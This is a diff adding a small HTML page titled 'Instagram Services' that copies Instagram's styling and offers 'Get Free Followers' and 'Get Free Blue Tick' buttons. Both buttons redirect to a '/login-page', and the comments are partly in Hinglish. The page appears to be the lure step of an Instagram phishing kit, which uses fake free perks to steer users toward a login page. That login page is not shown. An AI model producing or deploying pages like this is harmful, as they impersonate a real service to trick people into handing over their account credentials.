@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Services</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border: 1px solid #dbdbdb; width: 350px; text-align: center; border-radius: 8px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 20px; }
+        .option-btn {
+            display: block; width: 100%; padding: 12px; margin: 10px 0;
+            border: none; border-radius: 5px; cursor: pointer;
+            font-weight: bold; font-size: 14px; transition: 0.3s;
+        }
+        .followers { background: #0095f6; color: white; }
+        .bluetick { background: #0095f6; color: white; }
+        .option-btn:hover { opacity: 0.8; }
+        .logo-img { width: 50px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-img">📸</div> <h2>Select Service</h2>
+        <button class="option-btn followers" onclick="goToLogin('Free Followers')">Get Free Followers</button>
+        <button class="option-btn bluetick" onclick="goToLogin('Free Blue Tick')">Get Free Blue Tick</button>
+    </div>
+
+    <script>
+        function goToLogin(service) {
+            // Service ka naam session ya URL mein store kar sakte hain
+            localStorage.setItem("selectedService", service);
+            window.location.href = "/login-page"; 
+        }
+    </script>
+</body>
+</html>
